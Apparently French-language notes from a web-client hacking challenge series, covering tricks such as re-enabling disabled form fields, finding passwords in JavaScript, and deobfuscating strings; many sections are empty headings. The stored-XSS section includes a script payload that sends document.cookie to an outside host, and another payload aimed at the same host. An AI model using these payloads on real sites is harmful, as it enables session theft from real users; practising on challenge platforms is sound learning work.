## Web Client - Hacking

## 1 : Activer un form qui est désactivé par défaut en HTML


Console


    var input = document.body.getElementsByTagName("input");
    for(i=0; i<input.length; i++)
    {
      if( typeof(input[i]) != 'undefined' )
          input[i].disabled = false;
    }


Morale : Le HTML peut être modifié et détourné

## 2. Javascript authentification


   Chercher dans les outils de développeurs, le script de login.js
   Morale : Les fichiers Js peuvent être visible et leurs informations sensibles, dans F12->application->Frame->Script

## 3. Javascript source ( même astuce que précédemment )

## 4. Javascript authentification 2  ( même astuce que précédemment )


## 5. Javascript - obfuscation 1

   1. Chercher le fichier JS
   2. Trouver la chaine password
   3. passer la chaine dans la fonction

## 5. Javascript - obfuscation 2


   1. Chercher le pass dans js
   2. prendre la partie exadécimale du pass
   3. unescape('%28104%2C68%2C117%2C102%2C106%2C100%2C107%2C105%2C49%2C53%2C54%29');
   4. console.log(String.fromCharCode(104,68,117,102,106,100,107,105,49,53,54));

## 6. Javascript - native code

   1. Trouver le code pass natif
   2. Tostring sur le code native ( en enlevant les dernières parentheses pour enlever le mode function du code natif.

## 7. Javascript - webpack

   1. Chercher le flag dans les sources webpack

## 8. Javascript - Obfuscation 3


## 8. XSS - stockée 1

savoir si un formulaire permet l'éxécution de code :


    <script>console.warn('code executed');</script>
    <script>alert('code executed');</script>


Injection de HTML ( et <script> ) dans un form non sécurisé, pour recuperer un cookie sur un hooker a cookie ( avec mdp,..)


    <script>window.location="https://sacha.free.beeceptor.com?cookie="+document.cookie</script>


## 9. CSP Bypass - Inline code


## 10. CSRF - 0 protection



## 11. Flash - Authentification


## 12. CSP Bypass - Dangling markup


## 13. CSP Bypass - JSONP


## 14. CSRF - contournement de jeton


## 15. XSS - Volatile


essai:
Jouer avec l'URL, et le document cookie à envoyer sur un hooker de cookie

    <img src="https://sacha.free.beeceptor.com" onload=(alert('error'); >

## 16. CSP Bypass - Dangling markup 2


## 17. Javascript - Obfuscation 4


## 18. XSS - Stockée 2

## 19. HTTP Response Splitting


## 20. Javascript - Obfuscation 5


## 21. XSS - Stored - contournement de filtres


## 22. XSS - DOM Based
